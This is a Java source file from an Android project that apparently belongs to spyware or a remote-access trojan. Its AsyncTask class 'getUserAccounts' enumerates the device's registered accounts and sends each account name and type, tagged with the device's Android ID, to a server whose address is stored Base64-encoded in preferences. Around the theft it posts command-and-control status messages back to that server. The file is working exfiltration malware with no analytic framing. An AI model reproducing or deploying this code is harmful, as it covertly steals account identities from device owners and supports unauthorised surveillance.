package com.asynctask;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Base64;

import com.connect.MyApplication;
import com.utils.CommonUtils;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;

/**
 * Created by Conan0xff on 2017/12/5.
 */

public class getUserAccounts extends AsyncTask<String, Void, String> {
    String j = "";

    public getUserAccounts(String j) {
        this.j = j;
    }

    @Override
    protected String doInBackground(String... params) {
        AccountManager am = AccountManager.get(MyApplication.getContext());
        Account[] accounts = am.getAccounts();
        ArrayList<String> googleAccounts = new ArrayList<String>();
        int i = 0;
        for (Account ac : accounts) {
            if (i < Integer.parseInt(j)) {
                String acname = ac.name;
                String actype = ac.type;
                googleAccounts.add(ac.name);

                try {
                    String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
                    CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "[" + actype + "] " + acname);
                } catch (UnsupportedEncodingException e) {

                    e.printStackTrace();
                }
            }
            i++;
        }

        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {
        PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putBoolean("Get", false).commit();
        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "User Accounts Complete");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
    }

    @Override
    protected void onPreExecute() {
        while (PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getBoolean("Get", false) == true) {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Getting User Accounts");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
        PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putBoolean("Get", true).commit();
    }

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}

